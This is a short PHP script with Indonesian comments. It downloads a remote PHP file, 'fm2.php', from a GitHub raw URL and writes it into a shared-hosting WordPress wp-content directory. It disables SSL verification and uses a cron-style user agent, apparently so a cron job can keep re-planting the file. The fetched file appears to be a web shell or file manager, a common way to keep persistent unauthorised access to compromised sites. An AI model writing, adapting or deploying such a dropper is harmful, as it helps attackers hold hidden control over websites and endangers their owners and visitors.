<?php
// URL file yang akan diunduh
$url = 'https://raw.githubusercontent.com/Cnull00/file_file/refs/heads/main/fm2.php';

// Tentukan direktori tujuan (public_html atau www)
$targetDir = $_SERVER['HOME'] . '/public_html/wp-content/'; // Untuk shared hosting

// Jika public_html tidak ditemukan, coba gunakan www
if (!is_dir($targetDir)) {
    $targetDir = $_SERVER['HOME'] . '/www/wp-content/';
    if (!is_dir($targetDir)) {
        error_log("[" . date('Y-m-d H:i:s') . "] Error: Direktori public_html atau www tidak ditemukan!");
        exit(1);
    }
}

// Nama file output (gunakan nama asli dari URL)
$fileName = basename($url);
$targetFile = $targetDir . $fileName;

// Inisialisasi cURL
$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_USERAGENT => 'Mozilla/5.0 (Cronjob)',
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_CONNECTTIMEOUT => 10,
]);

// Eksekusi cURL
$fileContent = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

// Cek jika unduhan berhasil
if ($httpCode !== 200 || $error) {
    error_log("[" . date('Y-m-d H:i:s') . "] Error: Gagal mengunduh file. HTTP Code: $httpCode, Error: $error");
    exit(1);
}

// Simpan file ke direktori tujuan
if (file_put_contents($targetFile, $fileContent) === false) {
    error_log("[" . date('Y-m-d H:i:s') . "] Error: Gagal menyimpan file ke $targetFile");
    exit(1);
}

// Log sukses (opsional, bisa di-comment jika tidak perlu)
error_log("[" . date('Y-m-d H:i:s') . "] Sukses: File telah diperbarui di $targetFile");
exit(0);
?>